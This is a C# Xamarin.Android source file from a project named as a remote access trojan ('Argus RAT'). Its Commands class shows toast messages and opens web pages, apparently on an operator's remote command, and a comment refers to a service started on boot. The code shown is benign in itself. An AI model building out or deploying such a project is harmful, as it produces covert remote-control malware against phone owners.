using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;

namespace Argus___RAT
{
    static class Commands
    {
        /// <summary>
        /// Shows the given text as toast
        /// </summary>
        /// <param name="text">Text to toast out</param>
        public static void ShowToast(String text)
        {
            Application.SynchronizationContext.Post(_ => { Toast.MakeText(Android.App.Application.Context, text, ToastLength.Long).Show(); }, null);
        }

        /// <summary>
        /// Opens the given Webpage
        /// </summary>
        /// <param name="site">The page to open</param>
        public static void ShowWebsite(String site)
        {
            // DOES NOT WORK, WHEN SERVICE WAS STARTED ON BOOT!!! I'm working on a solution...
            try
            {
                Xamarin.Forms.Device.OpenUri(new Uri(site));
            }
            
            catch
            {
                // Catching exceptions is for communists...
            }
        }
    }
}